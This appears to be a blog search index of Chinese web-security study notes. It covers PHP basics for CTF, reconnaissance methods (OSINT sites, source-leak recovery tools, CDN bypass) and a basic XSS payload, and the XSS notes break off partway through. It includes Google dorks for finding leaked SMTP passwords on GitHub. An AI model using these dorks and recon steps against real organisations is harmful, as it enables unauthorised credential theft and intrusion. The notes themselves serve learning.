<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctf-php常见的点</title>
      <link href="/2025/03/01/ctf-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%82%B9/"/>
      <url>/2025/03/01/ctf-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%82%B9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-php常见的点</title>
      <link href="/2025/02/03/ctf-php%E5%B8%B8%E8%A7%81%E7%9A%84%E7%82%B9/"/>
      <url>/2025/02/03/ctf-php%E5%B8%B8%E8%A7%81%E7%9A%84%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="ctf-php常见的点"><a href="#ctf-php常见的点" class="headerlink" title="ctf-php常见的点"></a>ctf-php常见的点</h1><h4 id="php超级全局变量"><a href="#php超级全局变量" class="headerlink" title="php超级全局变量"></a><a href="https://www.runoob.com/php/php-superglobals.html">php超级全局变量</a></h4><h5 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h5><p>包含了项目内全部变量的全局组合数组，简单来说就是存有所有变量的健和值</p><h5 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h5><p>包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="GET-POST"><a href="#GET-POST" class="headerlink" title="$_GET&amp;$_POST"></a>$_GET&amp;$_POST</h5><p>get、post传参方式</p><h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h5><p>用于接收表单提供的传参值</p><h5 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h5><p>由于会话控制，获取SESSION值，其实就是常说的token</p><h5 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h5><p>cookie 常用于识别用户。cookie 是服务器留在用户计算机中的小文件。每当相同的计算机通过浏览器请求页面时，它同时会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。</p><h5 id="ENV-–-服务器端环境变量"><a href="#ENV-–-服务器端环境变量" class="headerlink" title="$_ENV –&gt; 服务器端环境变量"></a>$_ENV –&gt; 服务器端环境变量</h5><p>用于获取服务器环境变量</p><h4 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a><a href="https://www.runoob.com/php/php-var_dump-function.html">函数类</a></h4><h5 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump() 函数"></a>var_dump() 函数</h5><p>显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构</p><h5 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数"></a>preg_match()函数</h5><p>用于执行一个正则表达式匹配，常用于过滤和匹配</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点</title>
      <link href="/2025/01/18/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/"/>
      <url>/2025/01/18/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><h3 id="一、业务资产-应用类型分类"><a href="#一、业务资产-应用类型分类" class="headerlink" title="一、业务资产-应用类型分类"></a>一、业务资产-应用类型分类</h3><ul><li>WEB 应用</li><li>APP 应用</li><li>PC 端应用</li><li>小程序应用</li><li>微信公众号</li><li>其他产品等</li></ul><h3 id="二、web单域名获取"><a href="#二、web单域名获取" class="headerlink" title="二、web单域名获取"></a>二、web单域名获取</h3><ul><li>备案查询：</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//beian.miit.gov.cn/</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.beianx.cn/</span><br></code></pre></td></tr></table></figure><ul><li>企业产权：企业知识产权的信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>aiqicha.baidu.com<span class="hljs-regexp">//</span>/爱企查<br>https:<span class="hljs-regexp">//</span>www.xiaolanben.com<span class="hljs-regexp">//</span>/小蓝本<br></code></pre></td></tr></table></figure><ul><li>注册域名：查询目标的域名，被注册的就去搜索，有些域名可能被注册了但是没有使用</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//buy.cloud.tencent.com/domain</span><br></code></pre></td></tr></table></figure><ul><li>反查解析：通过<a href="https://so.csdn.net/so/search?q=IP%E5%9C%B0%E5%9D%80&spm=1001.2101.3001.7020">IP地址</a>反查解析看有没有域名</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//x.threatbook.cn/</span><br></code></pre></td></tr></table></figure><h3 id="三、Web-子域名获取-解析枚举"><a href="#三、Web-子域名获取-解析枚举" class="headerlink" title="三、Web 子域名获取-解析枚举"></a>三、Web 子域名获取-解析枚举</h3><ul><li>DNS 数据：我曾经寻找过这个域名，我曾经设置过这个域名的解析的时候会有一个记录。DNS数据就是通过查询<a href="https://so.csdn.net/so/search?q=%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95&spm=1001.2101.3001.7020">历史记录</a>来看，你这个域名用过哪些域名解析过</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//dnsdumpster.com/</span><br></code></pre></td></tr></table></figure><ul><li>证书查询：HTTPS协议是有证书的，可以通过网络查询这个证书用到了哪些域名上面，通过目标的一个证书，来匹配其他网站用户的证书</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//crt.sh/</span><br></code></pre></td></tr></table></figure><ul><li>网络空间：专门爬数据的平台，通过上面的查询可以获取到目标的一个信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>fofa.info<span class="hljs-regexp">//</span>/FOFA<br>http:<span class="hljs-regexp">//</span>hunter.qianxin.com<span class="hljs-regexp">//</span>/全球鹰<br>https:<span class="hljs-regexp">//</span>quake.<span class="hljs-number">360</span>.cn<span class="hljs-regexp">/quake/</span><span class="hljs-regexp">//</span><span class="hljs-number">360</span><br></code></pre></td></tr></table></figure><ul><li>威胁情报</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>x.threatbook.cn<span class="hljs-regexp">//</span>/微步在线<br>https:<span class="hljs-regexp">//</span>ti.qianxin.com<span class="hljs-regexp">//</span>/奇安信<br>https:<span class="hljs-regexp">//</span>ti.<span class="hljs-number">360</span>.cn<span class="hljs-regexp">/#/</span>homepage<span class="hljs-regexp">//</span><span class="hljs-number">360</span><br></code></pre></td></tr></table></figure><h3 id="四、Web-架构资产-平台指纹识别"><a href="#四、Web-架构资产-平台指纹识别" class="headerlink" title="四、Web 架构资产-平台指纹识别"></a>四、Web 架构资产-平台指纹识别</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>finger.tidesec.net<span class="hljs-regexp">//</span>/潮汐指纹  CMS信息<br>https:<span class="hljs-regexp">//</span>www.yunsee.cn<span class="hljs-regexp">//</span>/云悉指纹<br></code></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><h5 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h5><p>在开发源码时，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录。发布代码时，如果没有把.git目录删除就直接发布到<a href="https://so.csdn.net/so/search?q=%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">服务器</a>上，攻击者就可以通过它来恢复源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lijiejie/</span>GitHack <span class="hljs-regexp">//</span>工具<br></code></pre></td></tr></table></figure><h5 id="svn源码泄露"><a href="#svn源码泄露" class="headerlink" title="svn源码泄露"></a>svn源码泄露</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/callmefeifei/</span>SvnHack <span class="hljs-regexp">//</span>工具<br></code></pre></td></tr></table></figure><h5 id="DS-Store-文件泄露"><a href="#DS-Store-文件泄露" class="headerlink" title="DS_Store 文件泄露"></a>DS_Store 文件泄露</h5><p>使用MAC系统开发程序，会有DS_Store文件夹，针对目录结构和文件做一个存储，开发完后直接上传到服务器进行使用，但是没有删除DS_Store；那我们可以针对这个源码结构进行复现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lijiejie/</span>ds_store_exp <span class="hljs-regexp">//</span>工具<br></code></pre></td></tr></table></figure><h4 id="方法三一些交流平台可能会上传源码"><a href="#方法三一些交流平台可能会上传源码" class="headerlink" title="方法三一些交流平台可能会上传源码"></a>方法三一些交流平台可能会上传源码</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.oschina.net/</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//gitee.com/</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//github.com/</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.huzhan.com/</span><br></code></pre></td></tr></table></figure><h5 id="GITHUB资源搜索："><a href="#GITHUB资源搜索：" class="headerlink" title="GITHUB资源搜索："></a>GITHUB资源搜索：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">in</span>:name test #仓库标题搜索含有关键字<br><span class="hljs-attribute">in</span>:descripton test #仓库描述搜索含有关键字<br><span class="hljs-attribute">in</span>:readme test #Readme文件搜素含有关键字<br><span class="hljs-attribute">stars</span>:&gt;<span class="hljs-number">3000</span> test #stars数量大于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">stars</span>:<span class="hljs-number">1000</span>…<span class="hljs-number">3000</span> test #stars数量大于<span class="hljs-number">1000</span>小于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">forks</span>:&gt;<span class="hljs-number">1000</span> test #forks数量大于<span class="hljs-number">1000</span>的搜索关键字<br><span class="hljs-attribute">forks</span>:<span class="hljs-number">1000</span>…<span class="hljs-number">3000</span> test #forks数量大于<span class="hljs-number">1000</span>小于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">size</span>:&gt;=<span class="hljs-number">5000</span> test #指定仓库大于<span class="hljs-number">5000</span>k(<span class="hljs-number">5</span>M)的搜索关键字<br><span class="hljs-attribute">pushed</span>:&gt;<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span> test #发布时间大于<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span>的搜索关键字<br><span class="hljs-attribute">created</span>:&gt;<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span> test #创建时间大于<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span>的搜索关键字<br><span class="hljs-attribute">user</span>:test #用户名搜素<br><span class="hljs-attribute">license</span>:apache-<span class="hljs-number">2</span>.<span class="hljs-number">0</span> test #明确仓库的 LICENSE 搜索关键字 、<br><span class="hljs-attribute">language</span>:java test #在java语言的代码中搜索关键字<br><span class="hljs-attribute">user</span>:test in:name test #组合搜索,用户名test的标题含有test的<br></code></pre></td></tr></table></figure><h5 id="关键字配合谷歌搜索："><a href="#关键字配合谷歌搜索：" class="headerlink" title="关键字配合谷歌搜索："></a>关键字配合谷歌搜索：</h5><p>关键字可以通过安全工具对网站目录进行扫描，扫描完毕之后会给到信息的泄露</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">site:Github<span class="hljs-selector-class">.com</span> smtp<br>site:Github<span class="hljs-selector-class">.com</span> smtp @qq<span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">126</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">163</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @sina<span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.cn</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp password<br>site:Github<span class="hljs-selector-class">.com</span> String password smtp<br></code></pre></td></tr></table></figure><h5 id="码云搜索"><a href="#码云搜索" class="headerlink" title="码云搜索"></a>码云搜索</h5><p>网站的前端可能存源码的敏感文件，可以以这些文件为指纹去搜索</p><h3 id="五、环境复现"><a href="#五、环境复现" class="headerlink" title="五、环境复现"></a>五、环境复现</h3><table><thead><tr><th><strong>标签</strong></th><th><strong>名称</strong></th><th><strong>地址</strong></th></tr></thead><tbody><tr><td>企业信息</td><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>企业信息</td><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企业信息</td><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企业信息</td><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>企业信息</td><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>企业信息</td><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr><tr><td>备案信息</td><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案信息</td><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr><tr><td>公众号信息</td><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr><tr><td>注册域名</td><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr><tr><td><strong>标签</strong></td><td><strong>名称</strong></td><td><strong>地址</strong></td></tr><tr><td>DNS 数据</td><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr><tr><td>证书查询</td><td>CertificateSearch</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr><tr><td>网络空间</td><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>网络空间</td><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>网络空间</td><td>360</td><td><a href="https://quake.360.cn/quake/%23/index">https://quake.360.cn/quake/</a></td></tr><tr><td>威胁情报</td><td>微步在线 情报社区</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>威胁情报</td><td>奇安信 威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>威胁情报</td><td>360 威胁情报中心</td><td><a href="https://ti.360.cn/%23/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>枚举解析</td><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>枚举解析</td><td>DNSGrep 子域名查询</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>枚举解析</td><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr><tr><td>指纹识别</td><td>在线 cms 指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger 潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星 Finger-P</td><td><a href="https://fp.shuziguanxing.com/">https://fp.shuziguanxing.com</a></td></tr><tr><td><strong>标签</strong></td><td><strong>名称</strong></td><td><strong>地址</strong></td></tr><tr><td>网络空间</td><td>钟馗之眼</td><td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/</a></td></tr><tr><td>网络空间</td><td>零零信安</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>网络空间</td><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>网络空间</td><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>网络空间</td><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>网络空间</td><td>FullHunt</td><td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>网络空间</td><td>Soall Search Engine</td><td><a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>网络空间</td><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>网络空间</td><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>网络空间</td><td>DorkSearch</td><td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr><tr><td>威胁情报</td><td>VirusTotal 在线查杀平台</td><td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>威胁情报</td><td>VenusEye 威胁情报中心</td><td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn</a></td></tr><tr><td>威胁情报</td><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>威胁情报</td><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>威胁情报</td><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com</a></td></tr><tr><td>威胁情报</td><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec</a></td></tr><tr><td>威胁情报</td><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>威胁情报</td><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>威胁情报</td><td>深信服</td><td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/</a></td></tr><tr><td>威胁情报</td><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>威胁情报</td><td>听风者情报源 start.me</td><td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>威胁情报</td><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>威胁情报</td><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>威胁情报</td><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h3 id="六、JS安全问题"><a href="#六、JS安全问题" class="headerlink" title="六、JS安全问题"></a>六、JS安全问题</h3><h4 id="源码泄漏"><a href="#源码泄漏" class="headerlink" title="源码泄漏"></a>源码泄漏</h4><ol><li>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径</li><li>敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</li><li>API接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）</li></ol><h4 id="快速获取价值信息——JS代码中常见的重要标签和函数"><a href="#快速获取价值信息——JS代码中常见的重要标签和函数" class="headerlink" title="快速获取价值信息——JS代码中常见的重要标签和函数"></a>快速获取价值信息——JS代码中常见的重要标签和函数</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">src=——链接地址<br>path=    ——路径<br><span class="hljs-section">method:&quot;get&quot;    ——请求方法</span><br>http.get(<span class="hljs-string">&quot;</span><br><span class="hljs-string">method:&quot;</span>post<span class="hljs-string">&quot;</span><br><span class="hljs-string">http.post(&quot;</span><br>$.ajax<br><span class="hljs-section">http://service.httppos</span><br><span class="hljs-section">http://service.httpget</span><br><span class="hljs-section">accessKeyID:</span><br><span class="hljs-section">Screctkey:</span><br></code></pre></td></tr></table></figure><h4 id="FindSomething"><a href="#FindSomething" class="headerlink" title="FindSomething"></a>FindSomething</h4><p>从表现中JS中提取URL或者敏感数据<br><a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a><br>该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。</p><h4 id="ffuf-FUZZ"><a href="#ffuf-FUZZ" class="headerlink" title="ffuf-FUZZ"></a><strong>ffuf-FUZZ</strong></h4><ol><li>爆破找到更多的js文件分析更多的信息</li><li><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></li><li><a href="https://wordlists.assetnote.io——字典列表/">https://wordlists.assetnote.io——字典列表</a></li><li>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</li></ol><h4 id="CDN部署"><a href="#CDN部署" class="headerlink" title="CDN部署"></a>CDN部署</h4><p>开启CDN服务的情况下获取只能是ip</p><p><strong>判断是否开启了CDN</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">超级<span class="hljs-built_in">ping</span>: http://<span class="hljs-number">17</span>ce.com/<br>超级<span class="hljs-built_in">ping</span>: http://<span class="hljs-built_in">ping</span>.chinaz.com/<br></code></pre></td></tr></table></figure><p><strong>获取真实ip</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">存在主动漏洞来连接攻击者<br>存在<span class="hljs-string">phpinfo</span>等遗留文件<br>邮件信息无法布置<span class="hljs-string">CDN</span>,邮件头部包含邮件服务器真实<span class="hljs-string">ip</span>地址 <br>采用国外接口：<span class="hljs-string">https</span>://<span class="hljs-built_in">get-site-ip.com</span><br><span class="hljs-string">fuckcdn</span>全网扫描<br></code></pre></td></tr></table></figure><h3 id="APP资产"><a href="#APP资产" class="headerlink" title="APP资产"></a>APP资产</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">爱企查查知识产权<br>点点查询：diandian.<span class="hljs-keyword">com</span>  <br>七麦：qimai.<span class="hljs-keyword">cn</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">静态分析<span class="hljs-symbol">:https</span><span class="hljs-symbol">://www</span>.<span class="hljs-symbol">zhihuaspace.cn:</span><span class="hljs-number">8888</span>/<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="/2025/01/10/xss%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/10/xss%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="xss学习"><a href="#xss学习" class="headerlink" title="xss学习"></a>xss学习</h1><h4 id="类型一：未对敏感大小符号，引号等进行过滤"><a href="#类型一：未对敏感大小符号，引号等进行过滤" class="headerlink" title="类型一：未对敏感大小符号，引号等进行过滤"></a>类型一：未对敏感大小符号，引号等进行过滤</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">payload=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="类型二：被html实体转义"><a href="#类型二：被html实体转义" class="headerlink" title="类型二：被html实体转义"></a>类型二：被html实体转义</h4><p>可以用onfocus事件或onclick事件等on事件绕过</p><h5 id="onfocus事件"><a href="#onfocus事件" 